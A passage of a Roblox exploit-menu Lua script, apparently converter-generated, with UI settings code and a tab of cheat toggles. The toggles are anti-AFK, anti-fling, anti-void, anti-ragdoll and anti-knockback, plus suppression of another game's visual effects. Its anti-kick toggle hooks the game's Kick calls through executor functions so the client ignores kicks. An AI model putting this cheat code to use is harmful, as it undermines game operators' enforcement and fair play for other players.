					break
				end
				p = p.Parent
			end
		end
	})
	
	-- Apply saved GUI scale on startup
	task.wait(0.1)
	local savedScale = _G.ConfigData["guisize_guisize"]
	if savedScale then
		local value = tonumber(savedScale)
		if value then
			value = math.clamp(value, 0.70, 2.50)
			value = math.floor(value * 100 + 0.5) / 100
	
			local p = script.Parent
			while p do
				if p:IsA("ScreenGui") then
					local uiScale = p:FindFirstChildOfClass("UIScale")
					if not uiScale then
						uiScale = Instance.new("UIScale")
						uiScale.Parent = p
					end
					uiScale.Scale = value
					break
				end
				p = p.Parent
			end
		end
	end
	
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- DISABLE TOOLTIP
	-- ====================================================================================================
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local tooltip = screenGui:FindFirstChild("Tooltip")
	local uiScale = tooltip and tooltip:FindFirstChildOfClass("UIScale")
	
	_G.CreateSlider({
		frame = "tooltipsize",
		groupbox = script,
		tooltip = "Adjusts tooltip sizes. Set to 0 to completely hide it. Default = 1.00.",
		maxvalue = 3,
		default = 1,
		decimalplaces = 2,
		snap = true,
		callback = function(value)
			if uiScale then
				uiScale.Scale = value
			end
		end
	})
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- RESET SETTINGS
	-- ====================================================================================================
	_G.CreateButton({
		frame = "resetdefault",
		groupbox = script,
		tooltip = "Resets UI Settings to their default.",
		needsConfirm = true,
		confirmMessage = "Please press again...",
		confirmWait = 1.5,
		callback = function()
			-- Reset text size to default (5)
			_G.ConfigData["textsize"] = 5
	
			-- Reset GUI scale to default (1.00)
			_G.ConfigData["guisize_guisize"] = "1.00"
	
			-- Save config
			local HttpService = game:GetService("HttpService")
			pcall(function()
				writefile("myconfig.json", HttpService:JSONEncode(_G.ConfigData))
			end)
	
			-- Apply text size reset
			local screenGui = script.Parent
			while screenGui and not screenGui:IsA("ScreenGui") do
				screenGui = screenGui.Parent
			end
	
			if screenGui then
				-- Reset text sizes
				for _, obj in pairs(screenGui:GetDescendants()) do
					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
						if originalSizes[obj] then
							obj.TextSize = originalSizes[obj]
						end
					end
				end
	
				-- Update slider display
				local textsizeFrame = script.Parent:FindFirstChild("textsize")
				if textsizeFrame then
					local button = textsizeFrame:FindFirstChild("button")
					if button then
						local sliderFrame = button:FindFirstChild("sliderFrame")
						local text = button:FindFirstChild("text")
						local fillBar = sliderFrame and sliderFrame:FindFirstChild("fillbar")
	
						if fillBar and text then
							-- Update slider position (5 out of 0-10 = 50%)
							fillBar.Size = UDim2.new(0.5, 0, 1, 0)
							text.Text = "5 / 10"
						end
					end
				end
	
				-- Reset GUI scale
				local uiScale = screenGui:FindFirstChildOfClass("UIScale")
				if uiScale then
					uiScale.Scale = 1.00
				end
	
				-- Update textbox display
				local guisizeFrame = script.Parent:FindFirstChild("guisize")
				if guisizeFrame then
					local textboxFrame = guisizeFrame:FindFirstChild("guisize")
					if textboxFrame then
						local textbox = textboxFrame:FindFirstChild("textbox")
						if textbox then
							textbox.Text = "1.00"
						end
					end
				end
			end
		end,
	})
end;
task.spawn(C_6e);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.uisettingsScript
local function C_e4()
local script = G2L["e4"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	
	-- ====================================================================================================
	-- TEXT SCALING
	-- ====================================================================================================
	-- Store original text sizes
	local originalSizes = {}
	
	_G.CreateSlider({
		frame = "textsize",
		groupbox = script,
		tooltip = "Adjust the text size. Default = 5",
		minvalue = 0,
		maxvalue = 10,
		default = 5,
		decimalplaces = 0,
		snap = true,
		callback = function(value)
			local screenGui = script.Parent
			while screenGui and not screenGui:IsA("ScreenGui") do
				screenGui = screenGui.Parent
			end
	
			if screenGui then
				for _, obj in pairs(screenGui:GetDescendants()) do
					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
						-- Store original size on first run
						if not originalSizes[obj] then
							originalSizes[obj] = obj.TextSize
						end
	
						-- Calculate offset (5 = no change)
						local offset = value - 5
						obj.TextSize = originalSizes[obj] + offset
					end
				end
			end
		end
	})
	
	
	
	
	-- ====================================================================================================
	-- GUI SCALING
	-- ====================================================================================================
	_G.CreateTextbox({
		frame = "guisize",
		textboxname = "guisize",
		tooltip = "Scales the GUI size. Min = 0.70, Max = 2.50.",
		textboxcolor = "frameColor",
		hovercolor = true,
		callback = function(text)
			local value = tonumber(text)
	
			if not value then return end
	
			-- Clamp between 0.70 and 2.50
			value = math.clamp(value, 0.70, 2.50)
	
			-- Round to 2 decimals
			value = math.floor(value * 100 + 0.5) / 100
	
			-- Update textbox to show formatted value
			local p = script.Parent
			while p do
				if p:IsA("ScreenGui") then
					-- Find the textbox and update its display
					local frame = script.Parent:FindFirstChild("guisize")
					if frame then
						local textboxFrame = frame:FindFirstChild("guisize")
						if textboxFrame then
							local textbox = textboxFrame:FindFirstChild("textbox")
							if textbox then
								textbox.Text = string.format("%.2f", value)
							end
						end
					end
	
					-- Apply scale
					local uiScale = p:FindFirstChildOfClass("UIScale")
					if not uiScale then
						uiScale = Instance.new("UIScale")
						uiScale.Parent = p
					end
					uiScale.Scale = value
					break
				end
				p = p.Parent
			end
		end
	})
	
	-- Apply saved GUI scale on startup
	task.wait(0.1)
	local savedScale = _G.ConfigData["guisize_guisize"]
	if savedScale then
		local value = tonumber(savedScale)
		if value then
			value = math.clamp(value, 0.70, 2.50)
			value = math.floor(value * 100 + 0.5) / 100
	
			local p = script.Parent
			while p do
				if p:IsA("ScreenGui") then
					local uiScale = p:FindFirstChildOfClass("UIScale")
					if not uiScale then
						uiScale = Instance.new("UIScale")
						uiScale.Parent = p
					end
					uiScale.Scale = value
					break
				end
				p = p.Parent
			end
		end
	end
	
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- DISABLE TOOLTIP
	-- ====================================================================================================
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local tooltip = screenGui:FindFirstChild("Tooltip")
	local uiScale = tooltip and tooltip:FindFirstChildOfClass("UIScale")
	
	_G.CreateSlider({
		frame = "tooltipsize",
		groupbox = script,
		tooltip = "Adjusts tooltip sizes. Set to 0 to completely hide it. Default = 1.00.",
		maxvalue = 3,
		default = 1,
		decimalplaces = 2,
		snap = true,
		callback = function(value)
			if uiScale then
				uiScale.Scale = value
			end
		end
	})
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- RESET SETTINGS
	-- ====================================================================================================
	-- ====================================================================================================
	-- RESET SETTINGS
	-- ====================================================================================================
	_G.CreateButton({
		frame = "resetdefault",
		groupbox = script,
		tooltip = "Resets UI Settings to their default.",
		needsConfirm = true,
		confirmMessage = "Please press again...",
		confirmWait = 1.5,
		callback = function()
			-- Reset text size to default (5)
			_G.ConfigData["textsize"] = 5
	
			-- Reset GUI scale to default (1.00)
			_G.ConfigData["guisize_guisize"] = "1.00"
	
			-- Reset tooltip size to default (1.00)
			_G.ConfigData["tooltipsize"] = 1
	
			-- Reset center color picker to default (false)
			_G.ConfigData["centercolorpicker"] = false
	
			-- Reset GUI color theme to default
			_G.ConfigData["guicolortheme_guicolortheme"] = {
				r = 0,
				g = 123,
				b = 255,
				a = 0
			}
	
			-- Save config
			local HttpService = game:GetService("HttpService")
			pcall(function()
				writefile("myconfig.json", HttpService:JSONEncode(_G.ConfigData))
			end)
	
			-- Apply text size reset
			local screenGui = script.Parent
			while screenGui and not screenGui:IsA("ScreenGui") do
				screenGui = screenGui.Parent
			end
	
			if screenGui then
				-- Reset text sizes
				for _, obj in pairs(screenGui:GetDescendants()) do
					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
						if originalSizes[obj] then
							obj.TextSize = originalSizes[obj]
						end
					end
				end
	
				-- Update text size slider display
				local textsizeFrame = script.Parent:FindFirstChild("textsize")
				if textsizeFrame then
					local button = textsizeFrame:FindFirstChild("button")
					if button then
						local sliderFrame = button:FindFirstChild("sliderFrame")
						local text = button:FindFirstChild("text")
						local fillBar = sliderFrame and sliderFrame:FindFirstChild("fillbar")
	
						if fillBar and text then
							fillBar.Size = UDim2.new(0.5, 0, 1, 0)
							text.Text = "5 / 10"
						end
					end
				end
	
				-- Reset GUI scale
				local uiScale = screenGui:FindFirstChildOfClass("UIScale")
				if uiScale then
					uiScale.Scale = 1.00
				end
	
				-- Update GUI size textbox display
				local guisizeFrame = script.Parent:FindFirstChild("guisize")
				if guisizeFrame then
					local textboxFrame = guisizeFrame:FindFirstChild("guisize")
					if textboxFrame then
						local textbox = textboxFrame:FindFirstChild("textbox")
						if textbox then
							textbox.Text = "1.00"
						end
					end
				end
	
				-- Reset tooltip size
				local tooltip = screenGui:FindFirstChild("Tooltip")
				local tooltipScale = tooltip and tooltip:FindFirstChildOfClass("UIScale")
				if tooltipScale then
					tooltipScale.Scale = 1.00
				end
	
				-- Update tooltip size slider display
				local tooltipsizeFrame = script.Parent:FindFirstChild("tooltipsize")
				if tooltipsizeFrame then
					local button = tooltipsizeFrame:FindFirstChild("button")
					if button then
						local sliderFrame = button:FindFirstChild("sliderFrame")
						local text = button:FindFirstChild("text")
						local fillBar = sliderFrame and sliderFrame:FindFirstChild("fillbar")
	
						if fillBar and text then
							fillBar.Size = UDim2.new(0.333, 0, 1, 0) -- 1.00 out of 0-3
							text.Text = "1.00 / 3.00"
						end
					end
				end
	
				-- Reset center color picker toggle
				_G.CenterColorPicker = false
	
				-- Reset GUI color theme
				local colorFrame = screenGui:FindFirstChild("Color")
				if colorFrame then
					colorFrame.BackgroundColor3 = Color3.fromRGB(0, 123, 255)
				end
			end
	
			_G.Notify("UI settings reset to default!", 3)
		end,
	})
	
	
	
	
	
	
	
	_G.CreateToggle({
		frame = "centercolorpicker",
		groupbox = script,
		tooltip = "Centers the color picker UI instead of it below the button. Best for phone users.",
		callback = function(isEnabled)
			_G.CenterColorPicker = isEnabled
		end
	})
	
	
	
	
	
	
	
	
	
	
	_G.CreateColorPicker({
		frame = "guicolortheme",
		colorpickerframe = "guicolortheme",
		tooltip = "Pick a color",
		default = Color3.fromRGB(0, 123, 255),
		title = "Change the GUI color",
		alpha = false,
		groupbox = script,
		callback = function(color, alpha)
			-- Find the ScreenGui
			local function getScreenGui()
				local p = script.Parent
				while p do
					if p:IsA("ScreenGui") then return p end
					p = p.Parent
				end
			end
	
			local screenGui = getScreenGui()
			if not screenGui then return end
	
			-- Find the Color frame
			local colorFrame = screenGui:FindFirstChild("Color")
			if colorFrame then
				colorFrame.BackgroundColor3 = color
			end
		end
	})
end;
task.spawn(C_e4);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.antiScript
local function C_138()
local script = G2L["138"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- ANTI AFK
	-- ====================================================================================================
	local afkConnection = nil
	
	_G.CreateToggle({
		frame = "afk",
		groupbox = script,
		tooltip = "Prevents you from disconnecting from being AFK for 20 minutes.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-AFK
				afkConnection = task.spawn(function()
					while isEnabled and _G.ConfigData["afk"] do
						local virtualUser = game:GetService("VirtualUser")
						virtualUser:CaptureController()
						virtualUser:ClickButton2(Vector2.new())
						task.wait(60)
					end
				end)
			else
				-- Disable Anti-AFK
				if afkConnection then
					task.cancel(afkConnection)
					afkConnection = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI FLING
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	local antiFlingConnection = nil
	
	_G.CreateToggle({
		frame = "fling",
		groupbox = script,
		tooltip = "Disables collision with other players to prevent you from getting flung.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Fling
				-- Set all current players to no collide
				for _, player in pairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								part.CanCollide = false
							end
						end
					end
				end
	
				-- Use Stepped for better anti-fling
				if antiFlingConnection then
					antiFlingConnection:Disconnect()
				end
	
				antiFlingConnection = RunService.Stepped:Connect(function()
					if not _G.ConfigData["fling"] then return end
	
					for _, player in pairs(Players:GetPlayers()) do
						if player ~= LocalPlayer and player.Character then
							for _, part in pairs(player.Character:GetDescendants()) do
								if part:IsA("BasePart") then
									part.CanCollide = false
								end
							end
						end
					end
				end)
			else
				-- Disable Anti-Fling
				if antiFlingConnection then
					antiFlingConnection:Disconnect()
					antiFlingConnection = nil
				end
	
				-- Re-enable collision for all players
				for _, player in pairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								part.CanCollide = true
							end
						end
					end
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI RAGDOLL
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	local ragdollConnection = nil
	
	_G.CreateToggle({
		frame = "ragdoll",
		groupbox = script,
		tooltip = "Prevents your character from ragdolling.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Ragdoll
				local character = LocalPlayer.Character
				if character then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
						humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
					end
				end
	
				-- Loop to constantly prevent ragdoll
				ragdollConnection = RunService.Heartbeat:Connect(function()
					if not _G.ConfigData["ragdoll"] then return end
	
					local chr = LocalPlayer.Character
					if not chr then return end
	
					local hum = chr:FindFirstChildOfClass("Humanoid")
					if not hum then return end
	
					-- Disable ragdoll constraints
					for _, part in pairs(chr:GetDescendants()) do
						if part:IsA("BallSocketConstraint") or part:IsA("HingeConstraint") then
							if part:FindFirstAncestorOfClass("Motor6D") == nil then
								part.Enabled = false
							end
						end
					end
	
					-- Force humanoid out of ragdoll state
					if hum:GetState() == Enum.HumanoidStateType.Ragdoll or
						hum:GetState() == Enum.HumanoidStateType.FallingDown then
						hum:ChangeState(Enum.HumanoidStateType.GettingUp)
					end
				end)
			else
				-- Disable Anti-Ragdoll
				if ragdollConnection then
					ragdollConnection:Disconnect()
					ragdollConnection = nil
				end
	
				local character = LocalPlayer.Character
				if character then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
						humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
					end
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI VOID
	-- ====================================================================================================
	local voidConnection = nil
	
	_G.CreateToggle({
		frame = "void",
		groupbox = script,
		tooltip = "Disables you from dying in the void.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Void
				workspace.FallenPartsDestroyHeight = 0/0
	
				-- Keep it set to NaN even if game tries to change it
				voidConnection = workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight"):Connect(function()
					if not _G.ConfigData["void"] then return end
	
					if workspace.FallenPartsDestroyHeight ~= 0/0 then
						workspace.FallenPartsDestroyHeight = 0/0
					end
				end)
			else
				-- Disable Anti-Void
				if voidConnection then
					voidConnection:Disconnect()
					voidConnection = nil
				end
	
				-- Reset to default Roblox value
				workspace.FallenPartsDestroyHeight = -500
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI GAMEPLAY PAUSED
	-- ====================================================================================================
	local CoreGui = game:GetService("CoreGui")
	local networkPausedConnection = nil
	
	_G.CreateToggle({
		frame = "gameplaypaused",
		groupbox = script,
		tooltip = "Disables 'Gameplay Paused' messages.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Gameplay Paused
				pcall(function()
					if networkPausedConnection then
						networkPausedConnection:Disconnect()
					end
				end)
	
				networkPausedConnection = CoreGui.RobloxGui.ChildAdded:Connect(function(obj)
					if obj.Name == "CoreScripts/NetworkPause" then
						obj:Destroy()
					end
				end)
	
				-- Remove existing pause screen
				pcall(function()
					CoreGui.RobloxGui["CoreScripts/NetworkPause"]:Destroy()
				end)
			else
				-- Disable Anti-Gameplay Paused
				if networkPausedConnection then
					networkPausedConnection:Disconnect()
					networkPausedConnection = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI KICK
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local oldhmmi = nil
	local oldhmmnc = nil
	local oldKickFunction = nil
	
	_G.CreateToggle({
		frame = "kick",
		groupbox = script,
		tooltip = "Prevents only client kicks from kicking you out of the game. Enabling this might cause lag issues.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Kick
				if not hookmetamethod then return end
	
				if hookfunction then
					oldKickFunction = hookfunction(LocalPlayer.Kick, function() end)
				end
	
				oldhmmi = hookmetamethod(game, "__index", function(self, method)
					if self == LocalPlayer and method:lower() == "kick" then
						return error("Expected ':' not '.' calling member function Kick", 2)
					end
					return oldhmmi(self, method)
				end)
	
				oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
					if self == LocalPlayer and getnamecallmethod():lower() == "kick" then
						return
					end
					return oldhmmnc(self, ...)
				end)
			else
				-- Disable Anti-Kick
				if oldKickFunction and hookfunction then
					pcall(function()
						hookfunction(LocalPlayer.Kick, oldKickFunction)
					end)
					oldKickFunction = nil
				end
	
				if oldhmmi and hookmetamethod then
					pcall(function()
						hookmetamethod(game, "__index", oldhmmi)
					end)
					oldhmmi = nil
				end
	
				if oldhmmnc and hookmetamethod then
					pcall(function()
						hookmetamethod(game, "__namecall", oldhmmnc)
					end)
					oldhmmnc = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI KNOCKBACK
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	local knockbackConnection = nil
	
	_G.CreateToggle({
		frame = "knockback",
		groupbox = script,
		tooltip = "Prevents your character from getting knockback.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Knockback
				knockbackConnection = RunService.Heartbeat:Connect(function()
					if not _G.ConfigData["knockback"] then return end
	
					local character = LocalPlayer.Character
					if not character then return end
	
					local hrp = character:FindFirstChild("HumanoidRootPart")
					if not hrp then return end
	
					-- Cancel horizontal velocity, keep vertical (for jumping/falling)
					hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
					hrp.AssemblyAngularVelocity = Vector3.zero
				end)
			else
				-- Disable Anti-Knockback
				if knockbackConnection then
					knockbackConnection:Disconnect()
					knockbackConnection = nil
				end
			end
		end
	})
	
end;
task.spawn(C_138);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.characterScript
local function C_19a()
local script = G2L["19a"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	-- ====================================================================================================
	-- FORCE R6
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local AnimCache = {}
	local r6Connection = nil
	
	-- R6 Animation IDs (standard Roblox R6 animations)
	local Animations = {
		Run = {
			RunAnim = 180426354
		},
		Walk = {
			WalkAnim = 180426354
		},
		Jump = {
			JumpAnim = 125750702
		},
		Idle = {
			Animation1 = 180435571,
			Animation2 = 180435571
		},
		Fall = {
			FallAnim = 180436148
		},
		Climb = {
			ClimbAnim = 180436334
		},
		Sit = {
			SitAnim = 178130996
		}
	}
	
	local function StopAnimations(Humanoid)
		for _, Animation in Humanoid:GetPlayingAnimationTracks() do
			Animation:Stop()
		end
	end
	
	local function LoadAnimations(Animate)
		AnimCache = {}
		for Animation, Child in Animations do
			for ChildName, ID in Child do
				local Found = Animate:FindFirstChild(Animation:lower())
				if not Found then continue end
	
				local Child = Found:FindFirstChild(ChildName)
				if not Child then continue end
	
				table.insert(AnimCache, {Child, Child.AnimationId})
				Child.AnimationId = ("rbxassetid://%s"):format(ID)
			end
		end
	end
	
	local function Animate(Character)
		local Humanoid = Character:WaitForChild("Humanoid")
		local Animate = Character:WaitForChild("Animate")
	
		task.wait(0.5)
	
		StopAnimations(Humanoid)
		LoadAnimations(Animate)
		StopAnimations(Humanoid)
	end
	
	_G.CreateToggle({
		frame = "R6",
		groupbox = script,
		tooltip = "Forces your character's rig type to R6.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Force R6
				local function HandleCharacter(Char)
					if not Char then return end
	
					local Hum = Char:WaitForChild("Humanoid")
					if not Hum or Hum.RigType ~= Enum.HumanoidRigType.R15 then return end
	
					Animate(Char)
				end
	
				HandleCharacter(LocalPlayer.Character)
				r6Connection = LocalPlayer.CharacterAdded:Connect(HandleCharacter)
			else
				-- Disable Force R6
				if r6Connection then
					r6Connection:Disconnect()
					r6Connection = nil
				end
	
				local Char = LocalPlayer.Character
				if not Char then return end
	
				local Hum = Char:FindFirstChildOfClass("Humanoid")
				if not Hum or Hum.RigType ~= Enum.HumanoidRigType.R15 then return end
	
				StopAnimations(Hum)
				for _, Data in AnimCache do
					local Child, Id = Data[1], Data[2]
					if not Child then continue end
	
					Child.AnimationId = Id
				end
				StopAnimations(Hum)
	
				AnimCache = {}
			end
		end
	})
	
	
	
	
	
	
	-- ====================================================================================================
	-- RESET CHARACTER
	-- ====================================================================================================
	_G.CreateButton({
		frame = "Reset",
		groupbox = script,
		tooltip = "Resets your character, hold for 1 second.",
		afterMessage = "Character reset!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		holdtime = 1,
		holdtext = "Hold... (%.1fs)",
		holdvisual = true,
		holdtextcolor = "frameColor",
		callback = function()
			if shared.ResetCharacter then
				shared.ResetCharacter()
				return true
			end
			return false
		end,
	})
	
	
	
	
	
	
	
end;
task.spawn(C_19a);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.antiScriptTCO
local function C_1c2()
local script = G2L["1c2"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	_G.CreateToggle({
		frame = "visual",
		groupbox = script,
		tooltip = "Hides all main visual effects which includes: blind, colorless, fog, and myopic.",
		callback = function(isEnabled)
			if isEnabled then
				-- Start the anti visual loop
				_G.AntiVisualLoop = game:GetService("RunService").Heartbeat:Connect(function()
					local Lighting = game:GetService("Lighting")
					local LocalPlayer = game:GetService("Players").LocalPlayer
	
					-- Anti Myopic
					local blur = Lighting:FindFirstChild("Blur")
					if blur then blur.Enabled = false end
	
					-- Anti Blind
					local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
					if playerGui then
						local blind = playerGui:FindFirstChild("Blind")
						if blind then
							local frame = blind:FindFirstChildOfClass("Frame")
							if frame then
								frame.BackgroundTransparency = 1
							end
						end
					end
	
					-- Anti Fog
					local fog = Lighting:FindFirstChild("Fog")
					if fog then fog.Density = 0 end
	
					-- Anti Colorless
					local rgb = Lighting:FindFirstChild("RGB")
					if rgb then rgb.Enabled = false end
				end)
			else
				-- Stop the loop when disabled
				if _G.AntiVisualLoop then
					_G.AntiVisualLoop:Disconnect()
					_G.AntiVisualLoop = nil
				end
			end
		end
	})
	
	
	
	
	-- ====================================================================================================
	-- VAMP
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "vampire",
		groupbox = script,
		tooltip = "Blocks out the Vampire Vanquisher gear from breaking your camera and inventory.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local StarterGui = game:GetService("StarterGui")
				local RunService = game:GetService("RunService")
	
				-- Function to run anti-vamp for 5 seconds after respawn
				local function onCharacterAdded(character)
					local humanoid = character:WaitForChild("Humanoid")
	
					-- Run anti-vamp loop for 5 seconds
					local startTime = tick()
					local tempLoop = RunService.Heartbeat:Connect(function()
						if tick() - startTime >= 5 then
							-- Stop after 5 seconds
							tempLoop:Disconnect()
							return
						end
	
						if humanoid and humanoid.Health > 0 then
							pcall(function()
								StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
							end)
							workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
							workspace.CurrentCamera.CameraSubject = humanoid
						end
					end)
				end
	
				-- Connect to character respawn
				_G.AntiVampConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
	
				-- Also run for current character if it exists
				if LocalPlayer.Character then
					onCharacterAdded(LocalPlayer.Character)
				end
			else
				-- Disconnect when disabled
				if _G.AntiVampConnection then
					_G.AntiVampConnection:Disconnect()
					_G.AntiVampConnection = nil
				end
			end
		end
	})
	
	
	
	
	
	
	-- ====================================================================================================
	-- GLITCH
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "glitch",
		groupbox = script,
		tooltip = "Prevents the glitch command from glitching you.",
		callback = function(isEnabled)
			if isEnabled then
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local RunService = game:GetService("RunService")
				local lastPosition = nil
				local lastOrientation = nil
				local hasTeleportedBack = false
	
				_G.AntiGlitchLoop = RunService.Heartbeat:Connect(function()
					local character = LocalPlayer.Character
					if not character then return end
